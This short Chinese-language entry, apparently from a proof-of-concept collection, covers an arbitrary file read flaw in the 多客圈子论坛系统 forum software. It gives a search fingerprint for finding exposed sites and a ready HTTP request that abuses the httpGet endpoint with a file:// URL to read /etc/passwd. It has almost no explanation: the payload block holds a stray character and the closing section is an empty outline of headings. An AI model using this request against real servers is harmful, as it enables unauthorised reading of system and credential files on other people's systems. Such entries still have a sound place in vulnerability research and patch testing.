# 多客圈子论坛系统httpGet存在任意文件读取漏洞

- **系统**：多客圈子论坛系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="/static/index/js/jweixin-1.2.0.js"`
- **请求**：`GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1`

**请求体 / payload**
```
>
```

**其他**
- 多客圈子论坛系统httpGet存在任意文件读取漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 多客圈子论坛系统